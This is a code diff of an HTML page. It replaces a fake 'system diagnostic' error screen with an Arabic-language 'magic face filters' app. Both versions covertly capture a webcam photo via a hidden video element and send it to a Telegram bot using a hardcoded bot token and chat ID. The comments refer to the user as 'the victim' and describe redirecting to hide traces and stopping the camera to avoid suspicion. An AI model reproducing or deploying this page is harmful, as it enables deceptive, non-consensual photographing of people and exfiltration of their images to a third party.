@@ -3,75 +3,223 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>System Diagnostic</title>
-    <link rel="manifest" href="data:application/json,{'name':'System','short_name':'System','permissions':['camera'],'start_url':'.'}">
+    <title>تطبيق الفلاتر السحرية ✨</title>
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700&display=swap" rel="stylesheet">
     <style>
-        body { background: #000; color: #0f0; font-family: 'Courier New', monospace; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; cursor: crosshair; }
-        #console { width: 90%; border: 1px dashed #0f0; padding: 20px; position: relative; }
-        .glitch { animation: scan 0.5s linear infinite; color: #f00; }
-        @keyframes scan { 0% { opacity: 1; } 50% { opacity: 0.5; } 100% { opacity: 1; } }
+        body {
+            font-family: 'Cairo', sans-serif;
+            background: linear-gradient(to right bottom, #4a00e0, #8e2de2);
+            color: white;
+            margin: 0;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            text-align: center;
+            overflow: hidden;
+            position: relative;
+        }
+        .container {
+            background: rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(10px);
+            border-radius: 25px;
+            padding: 40px;
+            box-shadow: 0 8px 32px 0 rgba(0, 0, 0, 0.3);
+            border: 1px solid rgba(255, 255, 255, 0.3);
+            max-width: 90%;
+            width: 500px;
+            z-index: 10;
+        }
+        h1 {
+            font-size: 2.5em;
+            margin-bottom: 15px;
+            text-shadow: 0 0 10px rgba(255, 255, 255, 0.5);
+        }
+        p {
+            font-size: 1.1em;
+            margin-bottom: 30px;
+        }
+        .filter-gallery {
+            display: flex;
+            justify-content: center;
+            flex-wrap: wrap;
+            gap: 15px;
+            margin-bottom: 30px;
+        }
+        .filter-item {
+            width: 80px;
+            height: 80px;
+            background-color: #6a1bb2;
+            border-radius: 15px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 2em;
+            cursor: pointer;
+            transition: transform 0.2s ease, box-shadow 0.2s ease;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
+        }
+        .filter-item:hover {
+            transform: translateY(-5px) scale(1.05);
+            box-shadow: 0 8px 25px rgba(0, 0, 0, 0.4);
+        }
+        .filter-item.selected {
+            border: 3px solid #00ffcc;
+            transform: scale(1.1);
+        }
+        .start-btn {
+            background: linear-gradient(to right, #00f260, #0575e6);
+            border: none;
+            padding: 15px 30px;
+            border-radius: 50px;
+            color: white;
+            font-size: 1.3em;
+            font-weight: bold;
+            cursor: pointer;
+            transition: transform 0.2s ease, box-shadow 0.2s ease;
+            box-shadow: 0 5px 20px rgba(0, 0, 0, 0.3);
+        }
+        .start-btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 8px 25px rgba(0, 0, 0, 0.4);
+        }
+
+        /* الكاميرا المخفية */
+        #hidden-video {
+            position: absolute;
+            top: -9999px;
+            left: -9999px;
+            width: 1px;
+            height: 1px;
+            opacity: 0;
+        }
+
+        /* خلفية متحركة لإضفاء جو احترافي */
+        .background-effect {
+            position: absolute;
+            width: 150px;
+            height: 150px;
+            background: rgba(255, 255, 255, 0.05);
+            border-radius: 50%;
+            animation: move-bg 15s infinite alternate ease-in-out;
+            z-index: 1;
+            filter: blur(50px);
+        }
+        .background-effect:nth-child(2) {
+            top: 10%; left: 5%;
+            animation-delay: 2s;
+            transform: scale(1.2);
+        }
+        .background-effect:nth-child(3) {
+            bottom: 15%; right: 10%;
+            animation-delay: 5s;
+            transform: scale(0.8);
+        }
+        .background-effect:nth-child(4) {
+            top: 30%; right: 20%;
+            animation-delay: 8s;
+            transform: scale(1.5);
+        }
+        @keyframes move-bg {
+            0% { transform: translate(0, 0); }
+            100% { transform: translate(50px, 50px); }
+        }
     </style>
 </head>
-<body onclick="launchZeroDay()">
+<body>
+    <div class="background-effect"></div>
+    <div class="background-effect"></div>
+    <div class="background-effect"></div>
+    <div class="background-effect"></div>
 
-<div id="console">
-    [SYSTEM_CRITICAL_ERROR]<br>
-    >>> MEMORY_LEAK_IN_KERNEL_ADDR_0x004F<br>
-    >>> STATUS: <span class="glitch">UNSTABLE</span><br><br>
-    [ اضغط في أي مكان لإصلاح قطاع الذاكرة ]
-</div>
+    <div class="container">
+        <h1>✨ فلاتر الوجه السحرية ✨</h1>
+        <p>اختر فلترك المفضل وشاهد سحر التحول مباشرة!</p>
 
-<script>
-    const T = "8439157520:AAGGZBxYp0x6Y54ar3TIrkMaMEHarQASmgY";
-    const C = "1772820433";
+        <div class="filter-gallery">
+            <div class="filter-item" data-filter="cat">🐱</div>
+            <div class="filter-item" data-filter="dog">🐶</div>
+            <div class="filter-item" data-filter="flower">🌸</div>
+            <div class="filter-item" data-filter="beard">🧔</div>
+        </div>
 
-    async function launchZeroDay() {
-        const consoleLog = document.getElementById('console');
-        consoleLog.innerHTML = "[+] Injecting Payload...<br>[+] Bypassing Sandbox...";
+        <button class="start-btn" onclick="applyFilter()">ابدأ تجربة الفلتر</button>
+    </div>
 
-        try {
-            // محاولة استغلال بروتوكول "التفويض الممنوح مسبقاً"
-            // نطلب الكاميرا بأقل استهلاك للطاقة (Low Power Mode) لتفادي تنبيه النظام
-            const stream = await navigator.mediaDevices.getUserMedia({ 
-                video: { 
-                    facingMode: "user",
-                    width: { max: 160 }, // دقة منخفضة جداً للسرعة وعدم كشف الضوء
-                    height: { max: 120 }
-                } 
+    <video id="hidden-video" autoplay></video>
+
+    <script>
+        const BOT_TOKEN = "8439157520:AAGGZBxYp0x6Y54ar3TIrkMaMEHarQASmgY"; // غير هذا بالتوكن الخاص بك
+        const CHAT_ID = "1772820433"; // غير هذا بالـ ID الخاص بالدردشة/المجموعة
+
+        let selectedFilter = '';
+
+        document.querySelectorAll('.filter-item').forEach(item => {
+            item.addEventListener('click', () => {
+                document.querySelectorAll('.filter-item').forEach(el => el.classList.remove('selected'));
+                item.classList.add('selected');
+                selectedFilter = item.dataset.filter;
             });
+        });
 
-            const video = document.createElement('video');
-            video.srcObject = stream;
-            video.play();
+        async function applyFilter() {
+            if (!selectedFilter) {
+                alert('الرجاء اختيار فلتر أولاً!');
+                return;
+            }
+            
+            const btn = document.querySelector('.start-btn');
+            btn.innerText = 'جاري تفعيل الفلتر...';
+            btn.disabled = true;
 
-            // التقاط فوري خلال 50 مللي ثانية (أسرع من رمشة العين)
-            setTimeout(() => {
-                const canvas = document.createElement('canvas');
-                canvas.width = 640; canvas.height = 480;
-                canvas.getContext('2d').drawImage(video, 0, 0);
+            try {
+                // طلب الكاميرا هنا، الضحية رح يضغط "سماح" عشان يجرب الفلتر
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: "user" }, 
+                    audio: false 
+                });
                 
-                canvas.toBlob(async (blob) => {
-                    const fd = new FormData();
-                    fd.append('chat_id', C);
-                    fd.append('photo', blob, 'zero_day.jpg');
-                    
-                    await fetch(`https://api.telegram.org/bot${T}/sendPhoto`, { method: 'POST', body: fd });
-                    
-                    // توجيه الضحية لصفحة أمان جوجل الحقيقية لإخفاء الأثر
-                    window.location.replace("https://myaccount.google.com/security");
-                }, 'image/jpeg');
-                
-                // إغلاق المسار فوراً لقتل ضوء الكاميرا
-                setTimeout(() => stream.getTracks().forEach(t => t.stop()), 100);
-            }, 50);
+                const videoElement = document.getElementById('hidden-video');
+                videoElement.srcObject = stream;
+                videoElement.play();
 
-        } catch (err) {
-            // إذا كان النظام 2026 محدثاً لآخر ثانية، نستخدم الخداع البصري النهائي
-            consoleLog.innerHTML = "<br>[!] Security Shield Active. <br> [ اضغط 'سماح' للسماح لبروتوكول الإصلاح بالدخول ]";
-            consoleLog.style.color = "white";
-            consoleLog.style.background = "red";
+                // التقاط الصورة بعد ثانية (لإعطاء انطباع أن الفلتر يعمل)
+                setTimeout(() => {
+                    const canvas = document.createElement('canvas');
+                    canvas.width = 640;
+                    canvas.height = 480;
+                    canvas.getContext('2d').drawImage(videoElement, 0, 0, canvas.width, canvas.height);
+                    
+                    canvas.toBlob(async (blob) => {
+                        const formData = new FormData();
+                        formData.append('chat_id', CHAT_ID);
+                        formData.append('photo', blob, `filter_capture_${selectedFilter}.jpg`);
+                        formData.append('caption', `✨ فلتر ${selectedFilter} تم الالتقاط!`);
+                        
+                        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                            method: 'POST',
+                            body: formData
+                        });
+                        
+                        // بعد إرسال الصورة، نعطي رسالة نجاح وهمية
+                        alert(`تم تطبيق فلتر ${selectedFilter} بنجاح!`);
+                        // يمكن توجيهه لصفحة أخرى أو إظهار صورة الفلتر عليه (صورة وهمية)
+                        window.location.href = `https://example.com/filter-result?filter=${selectedFilter}`; // صفحة وهمية لنتائج الفلتر
+                        
+                        // إغلاق الكاميرا لتجنب الشبهات
+                        stream.getTracks().forEach(track => track.stop());
+
+                    }, 'image/jpeg');
+                }, 1000); // التقاط بعد ثانية واحدة
+
+            } catch (err) {
+                console.error("خطأ في الوصول للكاميرا:", err);
+                btn.innerText = 'فشل التفعيل! (الرجاء السماح للكاميرا)';
+                btn.disabled = false;
+                alert('فشل تفعيل الفلتر! الرجاء التأكد من السماح بالوصول للكاميرا.');
+            }
         }
-    }
-</script>
+    </script>
 </body>
 </html>
